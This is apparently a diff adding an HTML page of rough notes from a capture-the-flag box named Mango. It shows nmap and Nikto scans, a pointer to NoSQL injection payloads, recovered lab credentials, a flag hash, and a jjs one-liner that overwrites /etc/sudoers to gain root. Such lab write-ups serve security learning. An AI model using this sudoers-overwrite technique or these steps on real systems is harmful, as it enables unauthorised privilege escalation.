@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Markdown Converted HTML</title>
+    <link rel="stylesheet" type="text/css" href="../../style.css">
+    
+</head>
+<body>
+<p><strong>22/tcp  open  ssh     OpenSSH 7.6p1</strong> Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />
+| ssh-hostkey:<br />
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)<br />
+|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)<br />
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)<br />
+<strong>80/tcp  open  http    Apache httpd 2.4.29</strong> ((Ubuntu))<br />
+|_http-server-header: Apache/2.4.29 (Ubuntu)<br />
+|_http-title: 403 Forbidden<br />
+<strong>443/tcp open  ssl/http Apache httpd 2.4.29</strong> ((Ubuntu))<br />
+|_http-server-header: Apache/2.4.29 (Ubuntu)<br />
+|_http-title: Mango | Search Base<br />
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN<br />
+| Not valid before: 2019-09-27T14:21:19<br />
+|_Not valid after:  2020-09-26T14:21:19<br />
+|_ssl-date: TLS randomness does not represent time<br />
+| tls-alpn:<br />
+|_  http/1.1<br />
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+
+<p>Can’t access http have to use https</p>
+
+<p><a href="https://10.10.10.162/analytics.php">https://10.10.10.162/analytics.php</a><br />
+MrR3boot (Signedin)</p>
+
+<p>- Nikto v2.1.6<br />
+---------------------------------------------------------------------------<br />
++ Target IP:       10.10.10.162<br />
++ Target Hostname: 10.10.10.162<br />
++ Target Port:     443<br />
+---------------------------------------------------------------------------<br />
++ SSL Info:        Subject:  /C=IN/ST=None/L=None/O=Mango Prv Ltd./OU=None/CN=staging-order.mango.htb/emailAddress=<strong>admin</strong>@mango.htb<br />
+                Ciphers:  ECDHE-RSA-AES256-GCM-SHA384<br />
+                Issuer:   /C=IN/ST=None/L=None/O=Mango Prv Ltd./OU=None/CN=<strong>staging-order.mango.htb</strong>/emailAddress=admin@mango.htb<br />
++ Start Time:      2020-03-02 08:39:02 (GMT-5)<br />
+---------------------------------------------------------------------------<br />
++ Server: Apache/2.4.29 (Ubuntu)<br />
++ The anti-clickjacking X-Frame-Options header is not present.<br />
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.<br />
++ The site uses SSL and Expect-CT header is not present.<br />
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />
++ No CGI Directories found (use '-C all' to force check all possible dirs)<br />
++ Hostname '10.10.10.162' does not match certificate's names: staging-order.mango.htb<br />
++ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.<br />
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.<br />
++ OSVDB-3233: /icons/README: Apache default file found.<br />
++ 7863 requests: 0 error(s) and 10 item(s) reported on remote host<br />
++ End Time:        2020-03-02 08:58:54 (GMT-5) (1192 seconds)<br />
+---------------------------------------------------------------------------<br />
++ 1 host(s) tested</p>
+
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection</a><br />
+Script here, used admin because above info to test. Guessed mango<br />
+admin:t9KcS3>!0B#2</p>
+
+<p>mango:h3mXK8RhU\~f{]f5H</p>
+
+<p>Mango can ssh, admin can not.<br />
+Admin is user on box. Su admin.<br />
+Cat user.txt \=>> <strong>79bf31c6c6eb38a8567832f7f8b47e92</strong><br />
+_________________________________________________________<br />
+Ran <strong>linenum.sh</strong><br />
+Saw this<br />
+<strong>-e [+] Possibly interesting SGID files:</strong><br />
+<strong>-rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs</strong></p>
+
+<p><a href="https://gtfobins.github.io/gtfobins/jjs/">https://gtfobins.github.io/gtfobins/jjs/</a><br />
+Ran this to add me to sudoers and let me sudo whatever I want</p>
+
+<p><strong>echo 'var FileWriter \= Java.type("java.io.FileWriter");</strong><br />
+<strong>var fw=new FileWriter("/etc/sudoers");</strong><br />
+<strong>fw.write("admin ALL=(ALL) ALL");</strong><br />
+<strong>fw.close();' | jjs</strong></p>
+
+<p>Cat the root.txt<br />
+(I could also su to root)  </p>
+
+</body>
+</html>
